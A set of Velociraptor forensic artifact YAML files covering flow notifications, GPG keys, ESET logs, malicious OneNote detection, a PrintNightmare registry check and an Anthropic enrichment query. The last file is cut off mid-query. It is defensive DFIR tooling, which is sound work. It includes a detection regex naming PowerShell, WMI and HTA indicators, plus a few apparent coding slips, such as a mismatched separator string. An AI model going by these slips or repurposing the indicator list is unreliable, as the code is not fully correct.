  - name: ArtifactsToIgnore
    description: |
        Notifications will not be created for finished flows with artifact names matching this regex.
    default: ^Generic.Client.Info
  - name: NotifyHunts
    description: |
        Create notifications for finished flows that are part of a hunt. This may produce a lot of notifications, depending on the number of clients that will take part in the hunt.
    type: bool
  - name: DelayThreshold
    description: |
        Only create notifications if the flow has not finished within a certain number of seconds since it was created.
    default: 10

sources:
  - query: |
      LET NotifyUrl =       if(
                                condition=WebhookURL,
                                then=WebhookURL,
                                else=server_metadata().MattermostWebhookURL
                            )
      Let ServerUrl =       if(
                                condition=VelociraptorServerURL,
                                then=VelociraptorServerURL,
                                else=server_metadata().VelociraptorServerURL
                            )
                            
      // Get basic information about completed flows:     
      LET CompletedFlows =  SELECT      timestamp(epoch=Timestamp) AS FlowFinished,
                                        ClientId,
                                        FlowId
                            FROM        watch_monitoring(artifact='System.Flow.Completion')
                            WHERE       Flow.artifacts_with_results
                            AND         ClientId != 'server'
                            AND         NOT Flow.artifacts_with_results =~ ArtifactsToIgnore
                            AND         Flow.artifacts_with_results =~ ArtifactsToAlertOn
      
      // Look up more details about the flows using flows(), since the data returned by watch_monitoring() may be incomplete (like the create_time field):
      LET FlowInfo =        SELECT      ClientId,
                                        client_info(client_id=ClientId).os_info.fqdn AS FQDN,
                                        FlowId,
                                        timestamp(epoch=create_time) AS FlowCreated,
                                        timestamp(epoch=start_time) AS FlowStarted,
                                        FlowFinished,
                                        execution_duration/1000000000 AS Duration,
                                        join(array=artifacts_with_results, sep=', ') AS FlowResults,
                                        total_collected_rows AS CollectedRows,
                                        total_uploaded_files AS UploadedFiles,
                                        total_uploaded_bytes AS UploadedBytes,
                                        state='FINISHED' AS Success,
                                        status AS Error
                            FROM        flows(client_id=ClientId, flow_id=FlowId)
                            // Filter out flows part of hunts (if enabled) by the trailing ".H" in the ID:
                            WHERE       if(condition=NotifyHunts, then=true, else=not FlowId=~'\.H$')
                            // Notifications aren't necessarily useful if collections complete close to immediately:
                            AND         FlowFinished.Unix - timestamp(epoch=create_time).Unix >= atoi(string=DelayThreshold)
      
      LET Results =         SELECT      *
                            FROM        foreach(row=CompletedFlows, query=FlowInfo)
                            
      // If ServerUrl is provided, create Markdown links to the client, flows and hunt:
      LET ClientLink =      if(condition=ServerUrl,
                                then=format(format='[%v](%v/app/index.html#/host/%v)', args=[
                                    FQDN, ServerUrl, ClientId
                                ]),
                                else=FQDN
                            )
      LET FlowUrl =         format(format='%v/app/index.html#/collected/%v/%v/notebook', args=[
                                ServerUrl, ClientId, FlowId
                            ])
      LET FlowLink =        if(condition=ServerUrl,
                                then=format(format='[%v](%v)', args=[
                                    FlowId, FlowUrl
                                ]),
                                else=str(str=FlowId)
                            )
      // The HuntId has to be fetched by looking for the FlowId in all hunts:
      LET AllHunts =        SELECT      hunt_id AS HuntId,
                                        hunt_description AS HuntDesc
                            FROM        hunts()
      LET OurHunt(Fid)  =   SELECT      *
                            FROM        foreach(
                                            row=AllHunts,
                                            query={SELECT HuntId, HuntDesc FROM hunt_flows(hunt_id=HuntId) WHERE FlowId=Fid}
                                        )
      LET HuntLink_ =       SELECT      HuntDesc, HuntId
                            FROM        OurHunt(Fid=FlowId)
      LET HuntLink =        if(
                                condition=ServerUrl AND HuntLink_.HuntId,
                                then=format(format='[%v](%v/app/index.html#/hunts/%v)', args=[
                                    // There should only ever be one hunt for this flow:
                                    HuntLink_[0].HuntDesc, HuntLink_[0].ServerUrl, HuntLink_[0].HuntId 
                                ]),
                                else=if(condition=HuntLink_.HuntId, then=str(str=HuntLink_[0].HuntId), else='–')
                            )
      LET StateString =     if(condition=Success, then='finished collecting', else='FAILED to collect')
      LET Message =         format(format='Client %v has %v the artifact(s) %v, started at %v, in flow %v', args=[
                                ClientLink, StateString, FlowResults, FlowStarted.String, FlowLink
                            ])
                            // Create a more readable notification by using the formatting option called "secondary attachments". It's deemed a legacy format by Slack, but it works in Mattermost (whereas newer formatting options in Slack does not):
      LET Decorated =       dict(
                                attachments=[dict(
                                    mrkdwn_in=['text'],
                                    // Use a green colour if the collection succeeded, and red if it failed. The third state "RUNNING" should never be present in flows in this query:
                                    color=if(condition=Success, then='#36a64f', else='#e40303'),
                                    pretext=Message,
                                    title=format(format='Client collection %v', args=[if(condition=Success, then='FINISHED', else='FAILED')]),
                                    title_link=if(condition=ServerUrl, then=FlowUrl, else=null),
                                    fields=[
                                        dict(
                                            title='Collection created',
                                            value=FlowCreated.String,
                                            short=true
                                        ),
                                        dict(
                                            title='Collection started',
                                            value=FlowStarted.String,
                                            short=true
                                        ),
                                        dict(
                                            title='Error',
                                            value=if(condition=Error, then=Error, else='–'),
                                            short=true
                                        ),
                                        dict(
                                            title='Hunt',
                                            value=if(condition=HuntLink, then=HuntLink, else='–'),
                                            short=true
                                        ),
                                        dict(
                                            title='Duration',
                                            value=format(format='%.1f s', args=[Duration]),
                                            short=true
                                        ),
                                        dict(
                                            title='Collected rows',
                                            value=CollectedRows,
                                            short=true
                                        ),
                                        dict(
                                            title='Uploaded files',
                                            value=UploadedFiles,
                                            short=true
                                        ),
                                        dict(
                                            title='Uploaded bytes',
                                            value=UploadedBytes,
                                            short=true
                                        ),
                                    ]
                                ),]
                            )
      LET Payload =         if(condition=Decorate, then=Decorated, else=Message)
      
      LET Notify =          SELECT      Response, Content
                            FROM        http_client(
                                            data=serialize(item=Payload, format='json'),
                                            headers=dict(`Content-Type`='application/json'),
                                            method='POST',
                                            url=NotifyUrl
                                        )
                            WHERE       NotifyUrl
                            AND         if(condition=Response=200,
                                            then=log(level='INFO', message='Notification sent'),
                                            else=log(level='WARN', message=format(format='Failed to send notification: Reponse: %v', args=[Response]))
                                        )

      SELECT * FROM foreach(row=Results, query=Notify)
---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Debian.GPGKeys.yaml
======
name: Linux.Debian.GPGKeys
description: |
  Extract keys, fingerprints and identities from GPG keys.

  This artifact runs the tool "gpg" (must be installed on the system) on the
  files found matching the globs in KeyringFiles. The files need not be keyrings.

  Every entry consists of a public or secret key, optional subkeys and optional
  identities. This artifact may be useful in other artifacts to inspect GPG
  files or GPG data in order to correlate keys by their IDs, or look at connected
  user IDs.

  This artifact doesn't provide any information about whether a key is
  "trustworthy".

  Note that some keyring files contain a lot of subkeys and identities.

  The following columns are returned by this artifact:

    - OSPath: Path to the key file
    - KeyInfo: dict with the following entries:
      - Type: pub|sub
      - ID
      - Fingerprint
      - Algorithm
      - Validity
      - Created
      - Expiry
    - SubKeys: array of dicts with the same structure as KeyInfo
    - UserIDs: array of strings (name and e-mail)

reference:
  - https://manpages.debian.org/bookworm/apt/apt-key.8.en.html
  - https://github.com/CSNW/gnupg/blob/master/doc/DETAILS
  - https://www.mailpile.is/blog/2014-10-07_Some_Thoughts_on_GnuPG.html
  - https://www.ietf.org/rfc/rfc4880.txt

export: |
        /* Extract machine-"readable" data from the GPG keys found in the file.
           The format is documented in the reference above. However, as the blog
           post mentions, detailed knowledge about GPG is needed in order to
           decipher the output. See ParseKeyInfo_(). */
        LET InspectGPGFile(filename) = SELECT Stdout AS Info
            FROM execve(argv=['gpg', '--with-colons', filename])

        /* Pipe data to the same command as in InspectGPGFile(): */

        LET InspectGPGData(data) = SELECT *
            FROM InspectGPGFile(filename=tempfile(data=data))
        /* Convert the validity code to a more human-readable string (see
           reference for details): */
        LET GPGValidityString(validity) = regex_transform(source=validity, map=dict(
            `^o$`='Unknown',
            `^i$`='Invalid',
            `^d$`='Disabled',
            `^r$`='Revoked',
            `^e$`='Expired',
            `^-$`='Unknown',
            `^q$`='Unknown',
            `^n$`='Invalid',
            `^m$`='Marginally valid',
            `^f$`='Fully valid',
            `^u$`='Ultimately valid',
            `^w$`='Well-known',
            `^s$`='Special'
        ))

        /* Convert timestamp, but only if it is non-null: */
        LET MaybeTimestamp(epoch) = if(
            condition=epoch, then=timestamp(epoch=epoch), else=null)

        LET ParseKeyInfo_(data) = SELECT * FROM foreach(
            /* A file may contain several "keys" (i.e. sections of either a
               public or private key, followed by a fingerprint, subkeys and
               identities). In order to parse these sections, the contents of
               the file are split (an arbitraray binary blob is used): */
            row={SELECT split(sep_string='\x01\x02\0x03',
                string=regex_replace(source=data, re='(?m)^(pub|sec):',replace='\x01\x02\x03$1')) AS KeyInfo
                FROM scope()},
            query={
                /* There is only one key (public or private) followed by an
                   optional fingerprint: */
                SELECT parse_string_with_regex(string=KeyInfo, regex=(
                    '''(?m)(?P<Type>pub|sec):(?P<Validity>[^:]*):(?P<Length>[^:]*):(?P<Algorithm>[^:]*):(?P<ID>[^:]*):(?P<Created>[^:]*):(?P<Expiry>[^:]*):[^:]*:(?P<Trust>[^:]*)''',
                    '''fpr:::::::::(?P<Fingerprint>[^:]*)'''
                )) AS KeyInfo,
                /* There may be none or several subkeys (following the same
                   format as public/private keys): */
                {SELECT Type,
                    ID,
                    Fingerprint,
                    atoi(string=Algorithm) AS Algorithm,
                    GPGValidityString(validity=Validity) AS Validity,
                    MaybeTimestamp(epoch=Created) AS Created,
                    MaybeTimestamp(epoch=Expiry) AS Expiry
                    FROM parse_records_with_regex(
                        file=KeyInfo,
                        accessor='data',
                        regex=(
                        '''(?m)(?P<Type>sub):(?P<Validity>[^:]*):(?P<Length>[^:]*):(?P<Algorithm>[^:]*):(?P<ID>[^:]*):(?P<Created>[^:]*):(?P<Expiry>[^:]*):[^:]*:(?P<Trust>[^:]*)''',
                            '''fpr:::::::::(?P<Fingerprint>[^:]*)'''
                        ))
                } AS SubKeys,
                /* There may be none or several identities: */
                array(uids={SELECT UserID FROM parse_records_with_regex(
                    file=KeyInfo,
                    accessor='data',
                    regex='''uid:::::::::(?P<UserID>[^:]*)''')}) AS UserIDs
                FROM scope()
                WHERE KeyInfo
            })

        LET ParseKeyInfo(data) = SELECT dict(
                Type=KeyInfo.Type,
                ID=KeyInfo.ID,
                Fingerprint=get(item=KeyInfo, field='Fingerprint', default=''),
                Algorithm=atoi(string=KeyInfo.Algorithm),
                Validity=GPGValidityString(validity=KeyInfo.Validity),
                Created=MaybeTimestamp(epoch=KeyInfo.Created),
                Expiry=MaybeTimestamp(epoch=KeyInfo.Expiry)
            ) AS KeyInfo,
            SubKeys,
            UserIDs
        FROM ParseKeyInfo_(data=data)

        LET ParseGPG(data) = SELECT *
            FROM ParseKeyInfo(data=InspectGPGData(data=data))

        LET ParseGPGFile(filename) = SELECT *
            FROM ParseKeyInfo(data=InspectGPGFile(filename=filename))

parameters:
  - name: KeyringFiles
    description: Globs to find GPG keyrings
    type: csv
    default: |
        KeyringGlobs
        /etc/apt/trusted.gpg
        /etc/apt/trusted.gpg.d/*.gpg
        /etc/apt/keyrings/*.gpg
        /usr/share/keyrings/*.gpg

precondition:
    SELECT OS From info() where OS = 'linux'

sources:
  - name: KeyringKeys
    query: |
        LET GPGKeys = SELECT * FROM foreach(
            row={SELECT OSPath FROM glob(globs=KeyringFiles.KeyringGlobs)},
            query={SELECT OSPath, * FROM ParseGPGFile(filename=OSPath)}
        )

        SELECT * FROM GPGKeys

---END OF FILE---

======
FILE: /content/exchange/artifacts/ESETLogs.yaml
======
name: Windows.ESET.Logs
author: Ján Trenčanský - j91321@infosec.exchange
description: |
   Parse logs from ESET antivirus products. This log contains information about detections made by the ESET modules such as Real-time filesystem proteciton, Firewall, HIPS, Device Control, HTTP filter, AMSI Scanner etc.
 
type: CLIENT
 
tools:
  - name: ESETLogCollector
    url: https://download.eset.com/com/eset/tools/diagnosis/log_collector/latest/esetlogcollector.exe
    expected_hash: c5c9b4ec7feca3f3ac43c71454e7e51f13f19ce52a0583d34b32f7df4bbea5db
    serve_locally: true
 
precondition: SELECT OS From info() where OS = 'windows'
 
parameters:
   - name: LogTargets
     default: "Threat,Hips,Fw,Web,Dev,BlkF"
     description: Selection of log targets to collect
 
required_permissions:
- EXECVE
 
sources:
  - name: Antivirus
    query: |
        LET tool <= SELECT * FROM Artifact.Generic.Utils.FetchBinary(ToolName="ESETLogCollector")
        LET tempfolder <= tempdir(remove_last=true)
        LET exe <= SELECT * FROM execve(argv= [ tool[0].OSPath,
           "/accepteula", "/OType:xml", "/Targets:"+LogTargets, tempfolder+'\\logstmp.zip' ], length=10000000)
        LET zip <= SELECT * FROM unzip(filename=tempfolder+'\\logstmp.zip',output_directory=tempfolder+'\\logs')
         
        LET xml <= SELECT get(item=parse_xml(file=OSPath), member='Events.Event') AS entries FROM glob(globs=tempfolder+'\\logs\\ESET\\Logs\\Common\\virlog.dat.xml')
        SELECT * FROM foreach(
            row=xml.entries,
            query={SELECT _value.AttrIdx AS ID, _value.AttrTime AS Timestamp, 'virlog.dat' AS Log, _value.Threat AS Threat, _value.AttrLevel AS Level, _value.Action AS Action, _value.Name AS Object, _value.Col7 AS SHA1, _value.Info AS Information, _value.Col8 AS Firstseen, _value.Scanner AS Scanner, _value.Object AS ObjectType, _value.User AS User, _value.AttrDeleted AS DeletedInLog FROM foreach(row=_value)})
            
  - name: HIPS
    query: |
        LET xml <= SELECT get(item=parse_xml(file=OSPath), member='Events.Event') AS entries FROM glob(globs=tempfolder+'\\logs\\ESET\\Logs\\Common\\hipslog.dat.xml')
        SELECT _value.AttrIdx AS ID, _value.AttrTime AS Timestamp, 'hipslog.dat' AS Log, _value.Rule AS RuleName, _value.AttrLevel AS Level, _value.Action AS Action, _value.Application AS Application, _value.Application_Hash AS ApplicationSHA1, _value.Target AS Target, _value.Target_Hash AS TargetSHA1, _value.AttrDeleted AS DeletedInLog FROM foreach(
            row=xml.entries,
            query={SELECT * FROM foreach(row=_value)})  
             
  - name: Firewall
    query: |
        LET xml <= SELECT get(item=parse_xml(file=OSPath), member='Events.Event') AS entries FROM glob(globs=tempfolder+'\\logs\\ESET\\Logs\\Net\\epfwlog.dat.xml')
        SELECT _value.AttrIdx AS ID, _value.AttrTime AS Timestamp, 'epfwlog.dat' AS Log, _value.Event AS Event, _value.Rule_worm_name AS RuleName, _value.AttrLevel AS Level, _value.Action AS Action, _value.Source AS Source, _value.Target AS Target, _value.Protocol AS Protocol, _value.Application AS Application, _value.Hash AS SHA1, _value.User AS User, _value.AttrDeleted AS DeletedInLog FROM foreach(
            row=xml.entries,
            query={SELECT * FROM foreach(row=_value)})
             
  - name: FilteredWebsites
    query: |
        LET xml <= SELECT get(item=parse_xml(file=OSPath), member='Events.Event') AS entries FROM glob(globs=tempfolder+'\\logs\\ESET\\Logs\\Net\\urllog.dat.xml')
        SELECT _value.AttrIdx AS ID, _value.AttrTime AS Timestamp, 'urllog.dat' AS Log, _value.URL AS URL, _value.Status AS Action, _value.Detection AS Threat, _value.AttrLevel AS Level, _value.Application AS Application, _value.Hash AS SHA1, _value.User AS User, _value.IP_address AS IPAddress, _value.AttrDeleted AS DeletedInLog FROM foreach(
            row=xml.entries,
            query={SELECT * FROM foreach(row=_value)})
             
  - name: BlockedFiles
    query: |
        LET xml <= SELECT get(item=parse_xml(file=OSPath), member='Events.Event') AS entries FROM glob(globs=tempfolder+'\\logs\\ESET\\Logs\\Common\\blocked.dat.xml')
        SELECT _value.AttrIdx AS ID, _value.AttrTime AS Timestamp, 'blocked.dat' AS Log, _value.File AS File, _value.Source AS Blocker, _value.Reason AS Reason, _value.AttrLevel AS Level, _value.Application AS Application, _value.Hash AS SHA1, _value.User AS User, _value.First_seen_here AS FirstSeen, _value.AttrDeleted AS DeletedInLog FROM foreach(
            row=xml.entries,
            query={SELECT * FROM foreach(row=_value)})
             
  - name: DeviceControl
    query: |
        LET xml <= SELECT get(item=parse_xml(file=OSPath), member='Events.Event') AS entries FROM glob(globs=tempfolder+'\\logs\\ESET\\Logs\\Common\\devctrllog.dat.xml')
        SELECT _value.AttrIdx AS ID, _value.AttrTime AS Timestamp, 'devctrllog.dat' AS Log, _value.Device AS Device, _value.Status AS Action, _value.AttrLevel AS Level, _value.User AS User, _value.User_SID AS SID, _value.Group AS Group, _value.Group_SID AS GroupSID, _value.Device_details AS DeviceDetails, _value.Event_details AS EventDetails, _value.AttrDeleted AS DeletedInLog FROM foreach(
            row=xml.entries,
            query={SELECT * FROM foreach(row=_value)})
---END OF FILE---

======
FILE: /content/exchange/artifacts/Onenote.yaml
======
name: Windows.Detection.Onenote
author: Matt Green - @mgreen27
description: |
    This artifact enables detection of malicious .one files and can also be used 
    as an embedded file and metadata parser.
    
    The artifact uses glob targeting and checks file headers to detect .one file 
    types in scope. Secondly the artifact looks for EmbeddedFile and Metadata headers.   
    Finally the artifact will parse the .one file from discovered offsets and 
    enable filters to determine rows returned.  
     
    By default filters target suspicious file content and metadata title text 
    observed in the wild.
    Modify ContentRegex to ```.``` to include all.  
    
    The artifact also allows upload of both embedded files and source .one files.
    
reference:
  - https://github.com/volexity/threat-intel/tree/main/tools/one-extract
  - https://blog.didierstevens.com/2023/01/22/analyzing-malicious-onenote-documents/
  
type: CLIENT

parameters:
   - name: TargetGlob
     description: Glob to target .one files
     default: C:\Users\**
   - name: ContentRegex
     description: Regex to filter for on embedded files or Title Metadata
     default: ^MZ|^TV(oA|pB|pQ|qA|qQ|ro)|^PK|This program cannot be run in dos mode.|@echo|<HTA:APPLICATION|/vbscript|WmiExec|Win32_Process|Powershell|comspec
   - name: PreviewBytes
     description: Number of bytes of embedded files to preview in hex
     type: int64
     default: 10000
   - name: ContentExclude
     description: Regex to filter out on embedded files or Title Metadata
   - name: IncludeAllMetadata
     type: bool
     description: Select to include all Metadata entries
   - name: UploadEmbedded
     type: bool
     description: Select to upload embedded files
   - name: UploadOriginal
     type: bool
     description: Upload original OneNote file
     
     
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' OR OS = 'linux' OR OS = 'darwin'

    query: |
      LET YaraRule = '''rule onenote_headers {
                strings:
                    $EmbeddedFile = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC }
                    $Metadata = { F3 1C 00 1C 30 1C 00 1C FF 1D 00 14 82 1d 00 14 }
    
                condition:
                    any of them
            }'''
    
      LET PROFILE = '''[[Metadata, 0, [
                            ["__Adjust", 2, "uint16"],
                            ["__SizeOffset",0,"Value",{"value":"x=>4 + (4 * x.__Adjust)"}],
                            ["Size", "x=>x.__SizeOffset", "uint16"],
                            ["__Title","x=>x.__SizeOffset + 4","String",{length: "x=>x.Size","term":"$$$_NOTERM_$$$"}],
                            ["Title",0,"Value",{"value":"x=>regex_replace(source=x.__Title,re='\\x00',replace='')"}],
                            ["CreateDate", "x=>x.__SizeOffset + 4 + x.Size + 32","WinFileTime"],
                            # TODO remove recursion lookup and find specific details... 
                            ["__FindOffset1", "x=>x.__SizeOffset + 4 + x.Size + 48","String",{length: 100, term_hex: "010100000000"}],
                            ["__FindOffset2", "x=>x.__SizeOffset + 4 + x.Size + 48","String",{length: 100, term_hex: "010000000000"}],
                            ["__ModificationOffset", 0,"Value",{"value":"x=>if(condition= len(list=x.__FindOffset1) < 100 OR len(list=x.__FindOffset2) < 100,
                                    then= if(condition= len(list=x.__FindOffset1) < len(list=x.__FindOffset2),
                                            then= x.__SizeOffset + 4 + x.Size + 48 + len(list=x.__FindOffset1) - 7,
                                            else= x.__SizeOffset + 4 + x.Size + 48 + len(list=x.__FindOffset2) - 7 ),
                                    else= null )"}],
                            ["__ModificationDate", "x=>x.__ModificationOffset","WinFileTime"],
                            ["ModificationDate", 0,"Value",{"value":"x=>if(condition= x.__ModificationOffset, 
                                                                            then= x.__ModificationDate,
                                                                            else= null)"}],
                        ]],
                        [EmbeddedFile, 0, [
                            ["Size", 16, "uint32"],
                            ["Magic",0,"Value",{"value":"x=>magic(accessor='data',path=read_file(filename=FileName,offset=String.Offset + 36,length=int(int=x.Size)))"}],
                            ["Extension",0,"Value",{"value":"x=>magic(type='extension',accessor='data',path=read_file(filename=FileName,offset=String.Offset + 36,length=int(int=x.Size)))"}],
                            ["SHA256",0,"Value",{"value":"x=>hash(hashselect='SHA256',accessor='data',path=read_file(filename=FileName,offset=String.Offset + 36,length=int(int=x.Size))).SHA256"}],
                        ]]]'''
      
      -- firstly we want to find all target files in scope by confirming header
      LET target_files = SELECT OSPath,Name,Size,Mtime,Btime,Ctime,Atime	,
                                hash(path=OSPath) as OneFileHash,
                                format(format='% x',args=[read_file(filename=OSPath,length=16),]) as _Header
        FROM glob(globs=TargetGlob)
        WHERE NOT IsDir
            AND _Header = 'e4 52 5c 7b 8c d8 a7 4d ae b1 53 78 d0 29 96 d3'
        
      -- Hash source file here for performance
      LET target_files_hash = SELECT *, hash(path=OSPath) as Hash FROM target_files
    
      -- finally find all headers and parse from offset
      LET results = SELECT  *,
                if(condition= Type='EmbeddedFile',
                then= read_file(filename=OSPath,offset=Offset,length= int(int=Extracted.Size)),
                else= null ) as _EmbeddedFile 
        FROM foreach(row=target_files_hash, query={
                SELECT  OSPath,Name,Size,
                    dict(Mtime=Mtime,Btime=Btime,Ctime=Ctime,Atime=Atime) as Timestamps,
                    OneFileHash,
                    if(condition= String.Name=~ 'metadata',
                        then= String.Offset - 4,
                        else= String.Offset + 36 ) as Offset,
                    strip(string=String.Name,prefix='\$') as Type,
                    parse_binary(filename=FileName, profile=PROFILE,
                        offset=if(condition= String.Name=~ 'metadata',
                                    then= String.Offset - 4,
                                    else= String.Offset), 
                        struct=if(condition= String.Name=~ 'metadata',
                                    then= 'Metadata',
                                    else= 'EmbeddedFile')) as Extracted
                FROM yara(files=OSPath,rules=YaraRule,number=9999)
                ORDER BY Offset
            })
        WHERE ( _EmbeddedFile =~ ContentRegex OR Extracted.Title =~ ContentRegex
                    AND NOT if(condition= ContentExclude,
                                then= _EmbeddedFile =~ ContentExclude,
                                else = False ) )
            OR if(condition= IncludeAllMetadata, then= Type='Metadata')

      LET upload_embedded = SELECT OSPath,Name,Size,Timestamps,
            OneFileHash,
            Offset, Type, Extracted,
            if(condition= Type='EmbeddedFile',
                then= read_file(filename=_EmbeddedFile,accessor='data',length=PreviewBytes ),
                else= null ) as EmbeddedPreview,
            if(condition= Type='EmbeddedFile',
                then= upload(accessor='scope',file="_EmbeddedFile",
                            name=format(format='%v_%v.extracted',args=[Name,Offset])),
                else= null ) as EmbeddedUpload 
        FROM results
        
      LET no_embedded_upload = SELECT  OSPath,Name,Size,Timestamps,
            OneFileHash, Offset, Type, Extracted,
            if(condition= Type='EmbeddedFile',
                then= read_file(filename=_EmbeddedFile,accessor='data',length=PreviewBytes ),
                else= null ) as EmbeddedPreview
        FROM results
        
      -- output rows, hidden fields dropped
      LET final_results = SELECT * FROM if(condition=UploadEmbedded,
                                                    then= upload_embedded,
                                                    else= no_embedded_upload )
                                                    
      -- finally we may want upload original OneNote file but only once for optimisation..
      LET lookup <= dict()
      LET upload_ospath = SELECT *,
                if(condition=get(item=lookup, field=OSPath.String), 
                    else=if(condition=set(item=lookup, field=OSPath.String, value=TRUE),
                            then=upload(file=OSPath))) AS OneFileUpload
        FROM final_results
      
       SELECT * FROM if(condition=UploadOriginal,
                        then= upload_ospath,
                        else= final_results )
                        
column_types:
  - name: EmbeddedPreview
    type: base64hex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Forensics.RecentFileCache.yaml
======
name: Windows.Forensics.RecentFileCache
author: Stephan Mikiss @stephmikiss (SEC Defence @SEC Consult)
description: |
   Parses the RecentFileCache as evidence of execution artifact existing on older Windows systems (<= Win 7).
   
   Full path, Drive letter and the binary name will be parsed. The order represents the timeline of the execution flow. However, there are no timestamps included in this artifact.

type: CLIENT
parameters:
    - name: FileGlob
      description: Glob to RecentFileCache.
      default: C:/Windows/appcompat/Programs/RecentFileCache.bcf
    - name: FullPathRegex
      description: Regex to filter in the full path of the entry.
      default: .
    - name: BinaryRegex
      description: Regex to filter for binary names.
      default: .

sources:
    - query: |

        LET entries = SELECT utf16(string=Entry) as FullPath
                      FROM parse_records_with_regex(
                            file="C:/Windows/appcompat/Programs/RecentFileCache.bcf",
                            regex='''[\x00]{3}(?P<Entry>[a-z]\x00:.+?\x00)[\x00]{2}''')
               
        SELECT parse_string_with_regex(string=FullPath,regex='''(?P<Drive>^[a-z]:)''').Drive as Drive,
               FullPath,
               parse_string_with_regex(string=FullPath,regex='''\\(?P<Binary>[^\\]+$)''').Binary as Binary
        FROM entries
        WHERE FullPath =~ FullPathRegex
            AND Binary =~ BinaryRegex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Registry.PrintNightmare.yaml
======
name: Windows.Registry.PrintNightmare
description: |
   CVE-2021-34527 or Windows Print Spooler Remote Code Execution Vulnerability
   
   A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.
   
   According to Microsoft, this vulnerability can only be exploited if the “NoWarningNoElevationOnInstall” key in the registry is set to 1. 
   
   The artifact scans the device registry to check if the beforementioned key exists or not; if it is undefined or doesn’t exist, then the system is not vulnerable to the PrintNightmare. Otherwise, the system is considered to be vulnerable to exploitation.
   
   This vulnerability can be exploited using the Evil Printer attack.
   
   Changing the registry values from 1 to 0 or Disabling the spooler when it's not in use is recommended as the next step after applying the patch.
   The following VQL query looks for the registry values to find a registry key named “NoWarningNoElevationOnInstall”.

   
   References:
   
   https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527

   https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Diving-Into-Spooler-Discovering-Lpe-And-Rce-Vulnerabilities-In-Windows-Printer.pdf

   https://nvd.nist.gov/vuln/detail/CVE-2021-34527

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT

author: Daksh Gajjar - @dakshgajjar

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: SearchRegistryGlob
    default: \HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\**
    description: Having NoWarningNoElevationOnInstall set to 1 makes your system vulnerable by design

sources:
  - query: |
        SELECT  Name as KeyName,
                FullPath,
                Data.type as KeyType, 
                Data.value as KeyValue,
                Sys,
                ModTime as Modified
        FROM glob(globs=SearchRegistryGlob, accessor='registry')
        
        WHERE KeyType = "DWORD"
        AND KeyName =~ "NoWarningNoElevationOnInstall"
                  
column_types:
  - name: Modified
    type: timestamp

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Network.Bluetooth.yaml
======
name: MacOS.Network.Bluetooth

type: CLIENT

author: Wes Lambert - @therealwlambert

description: |
  Collect information about connected or paired Bluetooth-enabled devices.

parameters:
  - name: BluetoothGlob
    default: /Library/Bluetooth/Library/Preferences/com.apple.MobileBluetooth.devices.plist

precondition:
      SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET BluetoothLocation = SELECT OSPath from glob(globs=BluetoothGlob)
      LET BluetoothDevices = SELECT plist(file=OSPath) AS BD FROM BluetoothLocation
      SELECT * from foreach(
            row=BluetoothDevices,
            query={
               SELECT _value.Name AS Name,
                      timestamp(epoch=_value.LastSeenTime) AS LastSeen,
                      _value.DefaultName AS Description,
                      base64decode(string=_value.DeviceClass) AS _DeviceClass,
                      _value.DeviceIdProduct AS DeviceIDProduct,
                      _value.DeviceIdVendor AS DeviceIdVendor,
                      _value.DeviceIdVendorSource AS DeviceIdVendorSource,
                      _value.DeviceIdVersion AS DeviceIdVersion,
                      _value.SerialPort AS SerialPort,
                      _value.ServiceRemote AS SerialRemote,
                      _value.initiateSDPMirroringState AS SDPMirroring,
                      _key AS MACAddress,
                      _value.DevicePrimaryHash AS DevicePrimaryHash,
                      _value AS _Value
               FROM items(item=BD)
          }
      )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Anthropic.yaml
======
name: Server.Enrichment.AI.Anthropic
author: Matt Green - @mgreen27
description: |
  Query Anthropic AI for analysis of data.
  
  Paramaters:
  
  * `PrePrompt` - Added as preprompt. Default is: 
  "You are a Cyber Incident Responder and need to analyze data. You have an eye 
  for detail and like to use short precise technical language. Analyze the 
  following data and provide summary analysis:"
  * `Prompt` - Is User prompt as string: When pushing a dict object via 
  PromtData good practice is add some strings related to the type of data for 
  analysis or artifact name to provide context.
  * `PromptData` - add optional object to be serialized and added to the User prompt.
  * `Model` - Model to use for your request. Default is claude-3-7-sonnet-20250219
  * AnthropicVersion - anthropic-version header
  * `MaxTokens` - Set max token size  default 64000
  
  This artifact can be called from within another artifact (such as one looking 
  for files) to enrich the data made available by that artifact.
  
type: SERVER

parameters:
    - name: PrePrompt
      type: string
      description: |
        Prompt to send with data. For example, when asking 
        a question, then providing data separately
      default: |
        You are a Cyber Incident responder and need to analyse forensic 
        collections. You have an eye for detail and like to use short precise 
        technical language. Your PRIMARY goal is to analyse the following data 
        and provide summary analysis:
    - name: Prompt
      type: string
      default: Can you list 10 Windows persistance items in bullet points?
    - name: PromptData
      type: string
      description: The data sent to Anthropic - this data is serialised and added to the prompt
    - name: Model
      type: string
      description: The model used for processing the prompt
      default: claude-3-7-sonnet-20250219
    - name: AnthropicVersion
      type: string
      description: anthropic-version header
      default: "2023-06-01"
    - name: AnthropicToken
      type: string
      description: Token for Anthropic. Leave blank here if using server metadata store.
    - name: MaxTokens
      type: int
      default: 64000

sources:
  - query: |
        LET Creds <= if(
            condition=AnthropicToken,
            then=AnthropicToken,
            else=server_metadata().AnthropicToken)
        LET messages = if(condition=PromptData,
                        then = dict(role='user',content=PrePrompt + Prompt + ' ' + serialize(item=PromptData)) ,
                        else= dict(role='user',content=PrePrompt + Prompt) )
        LET Data = if(condition=MaxTokens,
                        then= dict(model=Model, messages=[messages,],max_tokens=MaxTokens),
                        else= dict(model=Model, messages=[messages,]) 
                    )

        SELECT
            messages.content as UserPrompt,
            parse_json(data=Content).content[0].text AS ResponseText,
            parse_json(data=Content) AS ResponseDetails
        FROM http_client(
